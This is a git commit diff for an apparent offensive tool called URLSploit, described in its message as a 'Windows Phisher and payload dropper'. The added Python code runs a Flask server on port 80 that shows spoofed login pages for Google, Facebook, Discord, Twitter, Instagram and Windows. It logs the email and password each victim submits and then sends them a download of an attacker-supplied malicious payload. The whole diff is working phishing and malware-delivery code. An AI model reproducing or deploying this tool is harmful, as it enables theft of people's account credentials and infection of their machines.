2b2fc24b033cc185a34fda1c9b0f05f3195f85a5
quantumcore <fahad.mustafa0012@gmail.com>
2019-10-24 10:29:37 -0400

    Windows Phisher and payload dropper created

--- core/url_main.py
+++ core/url_main.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request 
+from flask import Flask, render_template, request, send_file
 import flask
 import _thread
 from colorama import Fore, Style
@@ -13,6 +13,22 @@ import time, os, sys
 colorama.init()
 # TODO-STARTUP : 
 # Animated intro (5 secs) 
+tag_ok = "["+Style.BRIGHT+Fore.GREEN +"+"+Style.RESET_ALL+"]"
+tag_notok = "["+Style.BRIGHT+Fore.RED +"-"+Style.RESET_ALL+"]"
+tag_hm = "["+Style.BRIGHT+Fore.LIGHTCYAN_EX +"^"+Style.RESET_ALL+"]"
+
+templates = ["google",
+             "facebook",
+             "discordapp",
+             "twitter",
+             "instagram",
+             "windows"]
+
+def checkTemplate(template_name):
+    if(template_name in templates):
+        return True
+    else:
+        return False
 
 def clear():
     if(os.name == "nt"): 
@@ -23,14 +39,14 @@ def clear():
 def AnimateIntro():
     
     banner = [
-        
+        "\n                                                                          \n"
         "  ██╗   ██╗██████╗ ██╗         ███████╗██████╗ ██╗      ██████╗ ██╗████████╗\n"
         "  ██║   ██║██╔══██╗██║         ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n"
         "  ██║   ██║██████╔╝██║         ███████╗██████╔╝██║     ██║   ██║██║   ██║   \n"
         "  ██║   ██║██╔══██╗██║         ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   \n"
         "  ╚██████╔╝██║  ██║███████╗    ███████║██║     ███████╗╚██████╔╝██║   ██║   \n"
         "   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   \n"
-        "                              Version 1                                     \n"                               
+        "                          Version 1 by QuantumCore                          \n"                               
     
     ]
     clear()
@@ -40,3 +56,41 @@ def AnimateIntro():
             sys.stdout.flush()  
             time.sleep(0.001)          
     print('')  
+
+
+def WebServer(mode, payload):
+    app = Flask("Urlsploit", template_folder="templates")
+    app.static_folder = 'static'
+    global index_file
+    if(mode == "google"):
+        index_file = "google.html"
+    elif(mode == "facebook"):
+        index_file = "facebook.html"
+    elif(mode == "discordapp"):
+        index_file = "discord.html"
+    elif(mode == "twitter"):
+        index_file = "twitter.html"
+    elif(mode == "instagram"):
+        index_file = "instagram.html"
+    elif(mode == "windows"):
+        index_file = "windows.html"
+    else:
+        print(tag_notok + " Error : Mode not found.")
+
+    @app.route("/")
+    def main():
+        return render_template(index_file)
+        
+
+    @app.route("/download", methods=["POST"])
+    def download():
+        if(request.method == "POST"):
+            winEmail = request.form.get('microsoftemail')
+            winPass = request.form.get('microsoftpassword')
+            print(tag_ok + " POST : {e}".format(e=winEmail))
+            print(tag_ok + " POST : {p}".format(p=winPass))
+            return send_file(payload, as_attachment=True)
+        
+
+
+    app.run(host="0.0.0.0", port=80)
--- urlsploit.py
+++ urlsploit.py
@@ -4,8 +4,30 @@ def main():
     AnimateIntro()
     parser = argparse.ArgumentParser(description="URLSploit.")
     parser.add_argument("--t", "-template", required=True,help="The template to use. Use --list-templates to view available templates.")
+    parser.add_argument("--p", "-payload", required=True, help="The path of payload to send.")
     args = parser.parse_args()
     
     template = args.t
-    print(template)
+    payload = args.p
+    print(tag_ok + " Starting URLSPLOIT with Template '{t}' and payload '{payload}'.".format(t=template, payload=payload))
+    print(tag_hm + " Checking if tempalate '{t}' is valid..".format(t=template))
+    if(checkTemplate(template) == True):
+        print(tag_ok + " Template is valid!")
+    else:
+        print(tag_notok + " Template '{er}' not found!? Available ones are.".format(er=template))
+        for i in range(len(templates)):
+            print(tag_hm + " Template : {ts}".format(ts=templates[i]))
+        print(tag_ok + " Use urlsploit -template <template name> -payload <payload path>")
+        exit(True)
+
+    print(tag_hm + " Checking if payload '{p}' is valid..".format(p=payload))
+    try:
+        malacious_file = open(payload, "rb")
+        malacious_file.close()
+        print(tag_ok + " Payload is valid!")
+        WebServer(template, payload)
+    except FileNotFoundError:
+        print(tag_notok + " '{p}' not found.".format(p=payload))
+        print(tag_ok + " Use urlsploit -template <template name> -payload <payload path>")
+        exit(True)
 main()
